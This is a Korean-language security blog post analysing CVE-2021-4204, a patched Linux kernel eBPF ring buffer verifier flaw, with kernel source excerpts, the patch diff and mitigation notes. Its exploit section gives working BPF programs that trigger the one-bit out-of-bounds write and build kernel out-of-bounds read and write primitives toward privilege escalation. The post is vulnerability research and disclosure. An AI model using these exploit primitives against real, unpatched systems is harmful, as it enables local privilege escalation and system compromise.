---
layout: post
title: "linux 최고의 샌드백은 bpf입니다, 부제 : bpf 1 bit oob to exploit"
author: "say2"
tags: [linux,kernel,bughunting]
categories: [Hacking,Bughunting]
---


# 1. Intro

인트로라 쓰고 주저리주저리라 말하겠습니다..

작년에 저는 pwn2own을 목표로 linux 커널 취약점을 오디팅했었습니다. 

linux kernel을 버그헌팅대상으로 본적도 처음이였고, 익스플로잇도 예전에 wargame에서 조금 배운게 다였지만, 도전은 누구나 할 수 있는 것이니까요!

그리고 정말 운좋게 얼마지나지 않아 버그를 찾았습니다. 익스플로잇도 버그 케이스가 좋아서 어렵지 않게 완성시켰습니다 :p 

다가올 실망은 모른채, 엄청난 럭키함에 취해 엄청 기뻐했습니다. 

첫번째 슬픔은 pwn2own의 rule을 확인했을때였습니다. pwn2own ubuntu lpe는 해마다 ubuntu 테스트환경의 버전이 올라갑니다. 그러면 올해 22.04버전이 기준이 되었는데, 22버전에서는 그전에 꺼져있던 옵션이 켜져서 default로 익스플로잇이 작동하지 않게 되었습니다.ㅜㅜㅜ

아쉬워서 트위터에 올린 [영상](https://twitter.com/say___2/status/1472948753242136577?s=20&t=vuuSIwL-sPiC0LXZzctd2w) 입니다.

아무튼 이 취약점은 ubuntu 기준 2022년 1월 11자로 패치가 되었습니다. (https://ubuntu.com/security/CVE-2021-4204, https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1956585)


글이라도 써야지라고 생각해서 미리 글을 써두고 저장은 해뒀는데(이전에 경어체를 하나도 안쓰다가 갑자기 등장한 이유입니다.. 과거에 경어체로 써놨었네요ㅎㅎ), 전 회사와 생긴 사정상 못 올리고 있다가 아까우니 올려나 볼까해서 지금 새벽에 글을 쓰고 있습니다.

그리고 방금 안 충격적인 사실은 글감도 뺏겼다는 사실이네요.. 어느 중국 해커가 이미 이 취약점에 대해 [익스](https://github.com/tr3ee/CVE-2021-4204)까지 올렸군요

그래도.. 영어로도 써놨었는데(사실 거의 번역기가 씀), 한국어로 한국인을 위해.. 올려봅니다! 


## 2. Background

bpf에 대해서는 이미 선행연구가 많이 진행되어있어서 찾아보면 구조에 관련된 글까지 자세하게 보실 수 있습니다.

잘써둔 글이 너무 많기 때문에 생략하겠습니다

## 3. Vulnerability

2020.5월에 만들어진 bpf ring buffer에서 발생한 취약점입니다.

https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=457f44363a8894135c85b7a9afd2bd8196db24ab

bpf에는 다양한 map type이 있습니다. 그 중 `BPF_MAP_TYPE_RINGBUF` 타입의 map을 생성하면 이 mapfd로 ringbuf관련 함수들을 사용할 수 있습니다. (bpf_ringbuf_reserve, bpf_ringbuf_query, bpf_ringbuf_output, bpf_ringbuf_submit, bpf_ringbuf_discard)

ring buffer는 eBPF에서 메모리 할당의 용도로 사용되는데, map을 생성할 때 메모리를 크게 할당한 뒤, 위의 세부함수들을 이용하여 필요한 만큼 가져다 쓸 수 있습니다.

취약점은 `bpf_ringbuf_submit` (또는 `bpf_ringbuf_discard`)에서 사용한 `ARG_PTR_TO_ALLOC_MEM` 타입의 argument가 verifier에서 type체크만 할 뿐 boundary 체크를 하지않아 발생됩니다. 이로 인해 out of bound access 가 가능하며, lpe로 이어집니다.

이제 좀 더 자세한 분석을 해보겠습니다. 먼저 `bpf_ringbuf_submit` 함수의 argument type정의를 한번 살펴보겠습니다. 여기서 정의된 ret type과 arg type은 bpf verifier에서 return register type을 정의하고 argument type을 검사하는데 쓰입니다. 

```c
   const struct bpf_func_proto bpf_ringbuf_submit_proto = {
   	.func		= bpf_ringbuf_submit,
   	.ret_type	= RET_VOID,
   	.arg1_type	= ARG_PTR_TO_ALLOC_MEM,
   	.arg2_type	= ARG_ANYTHING,
   };
```

arg1_type이  `ARG_PTR_TO_ALLOC_MEM` 타입을 사용하는 것을 확인할 수 있습니다. (`bpf_ringbuf_discard` also use it )

 `ARG_PTR_TO_ALLOC_MEM` 가 무엇을 의미하는지는 verifier.c코드(https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/tree/kernel/bpf/verifier.c?id=17727d232f2d8ee9e70022196936799e9bed0585#n4768)를 보면 알 수 있습니다.

```c
static const struct bpf_reg_types *compatible_reg_types[__BPF_ARG_TYPE_MAX] = {	
       ...
     	[ARG_PTR_TO_ALLOC_MEM]		= &alloc_mem_types,
     	[ARG_PTR_TO_ALLOC_MEM_OR_NULL]	= &alloc_mem_types,
     }
     static const struct bpf_reg_types alloc_mem_types = { 
       .types = { PTR_TO_MEM } 
    };

static int check_reg_type(struct bpf_verifier_env *env, u32 regno,
			  enum bpf_arg_type arg_type,
			  const u32 *arg_btf_id)
{
	struct bpf_reg_state *regs = cur_regs(env), *reg = &regs[regno];
	enum bpf_reg_type expected, type = reg->type;
	const struct bpf_reg_types *compatible;
	int i, j;

	compatible = compatible_reg_types[arg_type];
	if (!compatible) {
		verbose(env, "verifier internal error: unsupported arg type %d\n", arg_type);
		return -EFAULT;
	}

	for (i = 0; i < ARRAY_SIZE(compatible->types); i++) {
		expected = compatible->types[i];
		if (expected == NOT_INIT)
			break;

		if (type == expected)
			goto found;
	}

```

위의 코드는 `ARG_PTR_TO_ALLOC_MEM` arg type 이  `PTR_TO_MEM` type의 레지스터를 요구한다는 것을 의미합니다..

그렇다면 `PTR_TO_MEM` 타입의 레지스터는 어떻게 만들 수 있을까요? 

`kernel/bpf/verifier.c`

https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/tree/kernel/bpf/verifier.c?id=17727d232f2d8ee9e70022196936799e9bed0585#n5938

```c

static int check_helper_call(struct bpf_verifier_env *env, int func_id, int insn_idx){
     	if (env->ops->get_func_proto)
     		fn = env->ops->get_func_proto(func_id, env->prog);
     	...
     	} else if (fn->ret_type == RET_PTR_TO_ALLOC_MEM_OR_NULL) {
     		mark_reg_known_zero(env, regs, BPF_REG_0);
     		regs[BPF_REG_0].type = PTR_TO_MEM_OR_NULL;
     		regs[BPF_REG_0].mem_size = meta.mem_size;
     	} 
			...
```

`check_helper_call` 함수는  `BPF_CALL`  opcode를 검증하는 함수입니다. 이 함수는 위에서 설명한 proto type 구조체를 가져와서  (eg. bpf_ringbuf_submit_proto) 검증한 뒤  `BPF_REG_0` 레지스터(함수의 리턴값이 담기는 레지스터)의 타입을 정의합니다.

위의 코드에서 함수의 리턴타입이 `RET_PTR_TO_ALLOC_MEM_OR_NULL` 일 경우, `BPF_REG_0` 의 타입이 `PTR_TO_MEM_OR_NULL` 가 된다는 것을 알 수 있습니다.

그리고 같은 ringbuf함수인 `bpf_ringbuf_reserve` 함수의 ret_type에서 `RET_PTR_TO_ALLOC_MEM_OR_NULL` 타입을 찾을 수 있습니다.

```c
const struct bpf_func_proto bpf_ringbuf_reserve_proto = {
     	.func		= bpf_ringbuf_reserve,
     	.ret_type	= RET_PTR_TO_ALLOC_MEM_OR_NULL,
     	.arg1_type	= ARG_CONST_MAP_PTR,
     	.arg2_type	= ARG_CONST_ALLOC_SIZE_OR_ZERO,
     	.arg3_type	= ARG_ANYTHING,
     };
```



`bpf_ringbuf_reserve` 함수의 리턴값이 어떤 값을 의미하는지 따라가봅시다.

https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/tree/kernel/bpf/ringbuf.c?id=17727d232f2d8ee9e70022196936799e9bed0585#n305

```c
static void *__bpf_ringbuf_reserve(struct bpf_ringbuf *rb, u64 size)
     {
     	unsigned long cons_pos, prod_pos, new_prod_pos, flags;
     	u32 len, pg_off;
     	struct bpf_ringbuf_hdr *hdr;
     
     	if (unlikely(size > RINGBUF_MAX_RECORD_SZ))
     		return NULL;
     
     	len = round_up(size + BPF_RINGBUF_HDR_SZ, 8);
       if (len > rb->mask + 1)
     		return NULL;
     	...
     
     	hdr = (void *)rb->data + (prod_pos & rb->mask);
     	pg_off = bpf_ringbuf_rec_pg_off(rb, hdr);
     	hdr->len = size | BPF_RINGBUF_BUSY_BIT;
     	hdr->pg_off = pg_off;
     
     	/* pairs with consumer's smp_load_acquire() */
     	smp_store_release(&rb->producer_pos, new_prod_pos);
     
     	spin_unlock_irqrestore(&rb->spinlock, flags);
     
     	return (void *)hdr + BPF_RINGBUF_HDR_SZ;
     }
     
     BPF_CALL_3(bpf_ringbuf_reserve, struct bpf_map *, map, u64, size, u64, flags)
     {
     	struct bpf_ringbuf_map *rb_map;
     
     	if (unlikely(flags))
     		return 0;
     
     	rb_map = container_of(map, struct bpf_ringbuf_map, map);
     	return (unsigned long)__bpf_ringbuf_reserve(rb_map->rb, size);
     }
```

`bpf_ringbuf_reserve` 함수는 size만큼 map에서 메모리를 할당해주는 함수입니다. 간단하게 아래와 같은 structure의 청크가 생성이 되고 data의 주소가 return됩니다.

`| hdr(len, pg_off) |       data.          |`



다시 `bpf_ringbuf_submit` 가 이 포인터를 어떻게 사용하는지 보겠습니다.  

```c
BPF_CALL_2(bpf_ringbuf_submit, void *, sample, u64, flags)
     {
     	bpf_ringbuf_commit(sample, flags, false /* discard */);
     	return 0;
     }
     
static void bpf_ringbuf_commit(void *sample, u64 flags, bool discard)
{
  unsigned long rec_pos, cons_pos;
  struct bpf_ringbuf_hdr *hdr;
  struct bpf_ringbuf *rb;
  u32 new_len;

  hdr = sample - BPF_RINGBUF_HDR_SZ;               // (1)
  rb = bpf_ringbuf_restore_from_rec(hdr);
  new_len = hdr->len ^ BPF_RINGBUF_BUSY_BIT;      // (2)   
  if (discard)
    new_len |= BPF_RINGBUF_DISCARD_BIT;

  /* update record header with correct final size prefix */
  xchg(&hdr->len, new_len);

  /* if consumer caught up and is waiting for our record, notify about
     	 * new data availability
     	 */
  rec_pos = (void *)hdr - (void *)rb->data;
  cons_pos = smp_load_acquire(&rb->consumer_pos) & rb->mask;
	// (3) 
  if (flags & BPF_RB_FORCE_WAKEUP) 
    irq_work_queue(&rb->work);
  else if (cons_pos == rec_pos && !(flags & BPF_RB_NO_WAKEUP))
    irq_work_queue(&rb->work);
}
```

`bpf_ringbuf_commit` ( `bpf_ringbuf_submit`의 서브함수) 는 `sample` 포인터값으로부터(`PTR_TO_MEM` pointer) `BPF_RINGBUF_HDR_SZ` 값만큼을 빼 `hdr` 변수를  정의합니다.

즉, sample pointer는 ringbuf 청크의 data 주소로 bpf_ringbuf_commit 함수는 argument가 `bpf_ringbuf_reserve` 의 리턴값을 그대로 argument에 넣었다는 것을 가정합니다.

하지만 처음 언급했듯, `ARG_PTR_TO_ALLOC_MEM` 에 대한 체크를 verify단계에서 해줘야 합니다. 

그렇다면 이런 pointer type에 대한 argument의 access 체크는 어떤식으로 이루어 질까요?

https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/tree/kernel/bpf/verifier.c?id=17727d232f2d8ee9e70022196936799e9bed0585#n5994

```c
static int check_helper_call(struct bpf_verifier_env *env, struct bpf_insn *insn,
			     int *insn_idx_p)
{
  ...
	for (i = 0; i < MAX_BPF_FUNC_REG_ARGS; i++) {
		err = check_func_arg(env, i, &meta, fn);
		if (err)
			return err;
	}
  ...
}
```

`check_helpser_call` 함수는 CALL opcode를 검증하는 함수입니다. 위와 같이 순차적으로 각 argument register를 검증하는 `check_func_arg` 함수를 호출합니다.

`check_func_arg` 함수에서 포인터타입을 검증하는 방식은 아래와 같습니다.

https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/tree/kernel/bpf/verifier.c?id=17727d232f2d8ee9e70022196936799e9bed0585#n4981

```c


static int check_func_arg(struct bpf_verifier_env *env, u32 arg,
			  struct bpf_call_arg_meta *meta,
			  const struct bpf_func_proto *fn)
{
  ...
	} else if (arg_type_is_mem_ptr(arg_type)) {
		/* The access to this pointer is only checked when we hit the //(1)
		 * next is_mem_size argument below.
		 */
		meta->raw_mode = (arg_type == ARG_PTR_TO_UNINIT_MEM);
	} else if (arg_type_is_mem_size(arg_type)) {    // (2)
		bool zero_size_allowed = (arg_type == ARG_CONST_SIZE_OR_ZERO);
		meta->msize_max_value = reg->umax_value;
		if (!tnum_is_const(reg->var_off))
			meta = NULL;

		if (reg->smin_value < 0) {
			verbose(env, "R%d min value is negative, either use unsigned or 'var &= const'\n",
				regno);
			return -EACCES;
		}

		if (reg->umin_value == 0) {
			err = check_helper_mem_access(env, regno - 1, 0,
						      zero_size_allowed,
						      meta);
			if (err)
				return err;
		}

		if (reg->umax_value >= BPF_MAX_VAR_SIZ) {
			verbose(env, "R%d unbounded memory access, use 'var &= const' or 'if (var < const)'\n",
				regno);
			return -EACCES;
		}
		err = check_helper_mem_access(env, regno - 1,
					      reg->umax_value,
					      zero_size_allowed, meta);
		if (!err)
			err = mark_chain_precision(env, regno);
	} else if (arg_type_is_alloc_size(arg_type)) {
  ...
```

memory pointer 의 바운더리를 체크하는 핵심 함수는 `check_helper_mem_access` 입니다. (2)에서 argument가 memory size 타입이면, `check_helper_mem_access(env, regno - 1,reg->umax_value, zero_size_allowed, meta);` 함수를 호출하는 것을 볼 수 있습니다. 여기서 `regno-1` 을 사용하는 이유는 memory pointer arg를 사용할때 바로 다음 argument로 memory size 타입을 사용하기 때문입니다. 그래서 memory pointer arg는 (1)에 쓰여진 주석대로 바로다음 size argument를 체크할때 size값과 함께 바운더리 체크를 하게됩니다. 

하지만 `bpf_ringbuf_submit` 과  `bpf_ringbuf_discard` 함수의 경우 memory pointer type의 argument를 사용하면서 바로 뒤에 size type의 argument가 들어가지 않습니다. 

```c
const struct bpf_func_proto bpf_ringbuf_submit_proto = {
	.func		= bpf_ringbuf_submit,
	.ret_type	= RET_VOID,
	.arg1_type	= ARG_PTR_TO_ALLOC_MEM,
	.arg2_type	= ARG_ANYTHING,
};
const struct bpf_func_proto bpf_ringbuf_discard_proto = {
	.func		= bpf_ringbuf_discard,
	.ret_type	= RET_VOID,
	.arg1_type	= ARG_PTR_TO_ALLOC_MEM,
	.arg2_type	= ARG_ANYTHING,
};
```

따라서 pointer type의 바운더리 체크가 부재하여 취약점이 발생하게 되어  `PTR_TO_MEM` 타입의 레지스터를 ALU연산하고 함수를 호출시킴으로써 Out of Bound취약점이 생기게 됩니다.

## 4. Exploit

`bpf_ringbuf_commit` 함수의  `irq_work_queue` 함수에서 에서 예기치 않은 panic이 발생하는 것을 막기 위해 flag 값을 세팅하여 (3)의 조건문을 우회할 수 있습니다. 그러면 `bpf_ringbuf_submit` 함수의 핵심연산은 `hdr->len을 `BPF_RINGBUF_BUSY_BIT` 과 xor하는 것 밖에 남지 않게됩니다.(2)` 

`bpf_ringbuf_submit` 는 결국   `*(DWORD *)(ptr-8) = *(DWORD *)(ptr-8)^0x80000000(BPF_RINGBUF_BUSY_BIT);  ` 를 수행하게 됩니다. 그리고 이 ptr 주소를 oob로 access할 수 있습니다. 즉 1비트 oob xor이 가능합니다.

이제 ringbuf chunk주변에 어떤 값들이 있는지가 중요합니다.

chunk포인터를 거슬로 올라가면 map을 생성할때 만들어진 ringbuf header structure를 볼 수 있습니다. `ringbuf_map_alloc` 함수에서 호출하는 `bpf_ringbuf_alloc`  함수를 통해 이 구조를 알아봅시다.

https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/tree/kernel/bpf/ringbuf.c?id=17727d232f2d8ee9e70022196936799e9bed0585#n129

```c
static struct bpf_ringbuf *bpf_ringbuf_alloc(size_t data_sz, int numa_node)
{
  struct bpf_ringbuf *rb;

  rb = bpf_ringbuf_area_alloc(data_sz, numa_node);
  if (!rb)
    return NULL;

  spin_lock_init(&rb->spinlock);
  init_waitqueue_head(&rb->waitq);
  init_irq_work(&rb->work, bpf_ringbuf_notify);

  rb->mask = data_sz - 1;
  rb->consumer_pos = 0;
  rb->producer_pos = 0;

  return rb;
}
```

`rb->mask` 에는 data_sz-1의 값이 쓰여집니다.

rb->mask는 `bpf_ringbuf_reserve`에서 아래와 같이 쓰여집니다.

https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/tree/kernel/bpf/ringbuf.c?id=17727d232f2d8ee9e70022196936799e9bed0585#n305

```c
static void *__bpf_ringbuf_reserve(struct bpf_ringbuf *rb, u64 size)
{
     	unsigned long cons_pos, prod_pos, new_prod_pos, flags;
     	u32 len, pg_off;
     	struct bpf_ringbuf_hdr *hdr;
     
     	if (unlikely(size > RINGBUF_MAX_RECORD_SZ))
     		return NULL;
     
     	len = round_up(size + BPF_RINGBUF_HDR_SZ, 8);
       if (len > rb->mask + 1) // (1)
     		return NULL;
```

 `bpf_ringbuf_reserve` 에서는 size와 rb->mask를 비교하여 전체 할당크기보다 할당받으려는 size가 더 클 경우 NULL을 리턴합니다. (1) 즉,  `mask` 값이  ringbuf의 전체 사이즈의 역할로 사용됩니다. 우리는 oob로 이 rb->mask 값을 0x80000000과 xor하여 unsigned기준 매우 큰 값으로 바꿀 수 있습니다.

```c
int vuln_trigger(){
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_1, mapfd1),             // BPF_MAP_TYPE_RINGBUF mapfd
    BPF_MOV64_IMM(BPF_REG_2, 0),                  // r2 = 0 (size)
    BPF_MOV64_IMM(BPF_REG_3, 0), 									// r3 = 0 (flag)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
	  
		BPF_MOV64_REG(BPF_REG_1,BPF_REG_0),           // r1 = r0 (ringbuf_reserve return)
		BPF_ALU64_IMM(BPF_SUB, BPF_REG_1,0x2fd8-8),   // r1-0x2fd0 
		BPF_MOV64_IMM(BPF_REG_2, 1),                  // r2 = 1 (flag)
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit), // ringbuf_submit oob write
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};
	int progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
	logprint();
	if(progfd==-1){
		return -1;
	}
	runprog(progfd);
	return progfd;
}
```

이제 rb->mask를 oob를 이용하여 조작함으로써  `bpf_ringbuf_reserve` 의 요청 size가 map size보다 크더라도 함수가 성공하여 포인터를 리턴하게 됩니다.

그리고 함수가 성공할 경우 bpf verifier에서는 요청 사이즈를 return pointer의 범위로 간주하기 때문에, 이제 이 pointer를 이용해 자유로운 oob read write primitive를 얻을 수 있습니다. 

stable oob write

```c
uint64_t oobwrite(int offset,uint64_t value_64){
	adjust_prod_pos();
	uint32_t value_l=value_64&0xffffffff;
	uint32_t value_h=value_64>>32;
	struct bpf_insn prog[] = {
	  BPF_MOV64_IMM(BPF_REG_0, 0),                  // 
	  BPF_LD_MAP_FD(BPF_REG_1, mapfd1),             // BPF_MAP_TYPE_RINGBUF mapfd
    BPF_MOV64_IMM(BPF_REG_2, 0x20000000-8),       // r2 = 0x20000000-8 (size)
    BPF_MOV64_IMM(BPF_REG_3, 0), 									// r3 = 0 (flag)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
  	BPF_MOV64_REG(BPF_REG_4,BPF_REG_0),
    
	  BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),          // r2 = r0 alloc_mem
	  BPF_ALU64_IMM(BPF_ADD, BPF_REG_2,offset),  		// r3 = *(DWORD *)(r2+offset)
	  BPF_MOV64_IMM(BPF_REG_3, value_l),						// *(QWORD *)(r3) = value_64
	  BPF_STX_MEM(4,BPF_REG_2,BPF_REG_3,0),
	  BPF_MOV64_IMM(BPF_REG_3, value_h),
	  BPF_STX_MEM(4,BPF_REG_2,BPF_REG_3,4),
    
		BPF_MOV64_REG(BPF_REG_1, BPF_REG_4),
    BPF_MOV64_IMM(BPF_REG_2, 0),
	  BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,BPF_FUNC_ringbuf_discard),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
	};
	int progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
	logprint();
	if(progfd==-1){
		puts("oob write fail");
	  	return -1;
	}
	runprog(progfd);
	expected_prod_pos+=0x20000000;
	*(uint64_t *)((uint8_t *)cons_pos) += 0x20000000; 
	close(progfd);

	return 0;

}
```

oob read 입니다. `bpf_lookup_elem` 함수를 통해 map에 있는 값을 읽어올 수 있습니다.

```c
uint64_t oobread(int offset){
	adjust_prod_pos();
struct bpf_insn prog[] = {
	  BPF_MOV64_IMM(BPF_REG_0, 0),                  // 
	  BPF_LD_MAP_FD(BPF_REG_1, mapfd1),             // BPF_MAP_TYPE_RINGBUF mapfd
    BPF_MOV64_IMM(BPF_REG_2, 0x20000000-8),       // r2 = 0x20000000-8 (size)
    BPF_MOV64_IMM(BPF_REG_3, 0), 									// r3 = 0 (flag)
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
  	BPF_MOV64_REG(BPF_REG_4,BPF_REG_0),
  
	  BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),          // r2 = r0 alloc_mem
	  BPF_ALU64_IMM(BPF_ADD, BPF_REG_2,offset),  // r3 = *(DWORD *)(r2+offset)
	  BPF_LDX_MEM(4,BPF_REG_3,BPF_REG_2,0),         
	  BPF_LD_IMM64_RAW_FULL(BPF_REG_7,BPF_PSEUDO_MAP_VALUE,0,0,array_mapfd,0), // array_mapfd to get output
	  BPF_STX_MEM(4,BPF_REG_7,BPF_REG_3,0),         // *(DWORD *)(r7+0) = r3
	  BPF_LDX_MEM(4,BPF_REG_3,BPF_REG_2,4),         // r3 = *(DWORD *)(r2+offset+4) 
	  BPF_STX_MEM(4,BPF_REG_7,BPF_REG_3,4),         // *(DWORD *)(r7+4) = r3
  
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_4),
    BPF_MOV64_IMM(BPF_REG_2, 0),
	  BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,BPF_FUNC_ringbuf_discard),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
	};
	int progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
	logprint();
	if(progfd==-1){
		puts("oob read fail");
	  	return -1;
	}
	runprog(progfd);
	int key=0,ret;
	uint64_t value=0;
	uint32_t *values=calloc(1,0x300);
	
	ret = bpf_lookup_elem(array_mapfd,&key,values);
	value =*(uint64_t *)(values);
	free(values);
	expected_prod_pos+=0x20000000;
	*(uint64_t *)((uint8_t *)cons_pos) += 0x20000000; 
	close(progfd);
	return value;

}
```



21.04에서 테스트한 데모는 인트로에서도 걸어둔 링크로 보실 수 있습니다.(jekyll 블로그에 마크다운으로 비디오 올리는 방법이 있나요? 절대 귀찮은게 아닙니다)

https://twitter.com/say___2/status/1472948753242136577?s=20&t=vuuSIwL-sPiC0LXZzctd2w

https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html#unprivileged-bpf-disabled

로 인해 21.10 이상 버전부터는  bpf가 접근을 제한하는 미티게이션이 생겼습니다. (CAP_SYS_ADMIN, CAP_BPF 를 필요로 합니다.)



## 5. Patch

https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/impish/commit/?id=53fb7741ff9d546174dbb585957b4f8b6afbdb83

`ARG_PTR_TO_ALLOC_MEM` 타입일 경우 register가 상수가 아니거나 reg->off가 0이 아니면(연산되었는지 체크) 에러값을 반환합니다.

```diff
 		goto skip_type_check;
 
+	/* We already checked for NULL above */
+	if (arg_type == ARG_PTR_TO_ALLOC_MEM) {
+		if (reg->off != 0 || !tnum_is_const(reg->var_off)) {
+			verbose(env, "helper wants pointer to allocated memory\n");
+			return -EACCES;
+		}
+	}
+
 	err = check_reg_type(env, regno, arg_type, fn->arg_btf_id[arg]);
 	if (err)
 		return err;
```



## 6. reference

https://flatt.tech/reports/210401_pwn2own/

https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story

